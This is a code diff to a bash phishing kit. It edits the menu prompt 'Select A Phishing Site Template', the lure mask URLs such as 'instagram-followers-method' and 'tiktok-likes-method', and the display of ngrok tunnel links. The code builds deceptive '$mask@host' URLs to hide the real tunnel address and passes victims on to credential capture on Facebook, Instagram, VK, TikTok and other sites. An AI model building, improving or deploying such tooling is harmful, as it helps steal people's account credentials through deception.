@@ -245,8 +245,8 @@ start_ngrok() {
 	{ sleep 8; clear; banner_small; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1: ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2: ${GREEN}$mask@$ngrok_url1"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} HTTPS Protocol URL: ${GREEN}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} HTTP Protocol URL: ${GREEN}$mask@$ngrok_url1"
 	capture_data
 }
 
@@ -338,7 +338,7 @@ site_instagram() {
 		tunnel_menu
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 		website="ig_followers"
-		mask='http://instagram-followers-trick'
+		mask='http://instagram-followers-method'
 		tunnel_menu
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		website="insta_followers"
@@ -397,7 +397,7 @@ site_vk() {
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="vk"
-		mask='http://vk-premiuim-trick'
+		mask='http://vk-premiuim-method'
 		tunnel_menu
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 		website="vk_poll"
@@ -413,7 +413,7 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select a Phishing Site From Below ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} Select A Phishing Site Template From Below ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
@@ -464,7 +464,7 @@ main_menu() {
 		tunnel_menu
 	elif [[ "$REPLY" == 10 ]]; then
 		website="tiktok"
-		mask='http://tiktok-likes-trick'
+		mask='http://tiktok-likes-method'
 		tunnel_menu
 	elif [[ "$REPLY" == 11 ]]; then
 		website="twitch"
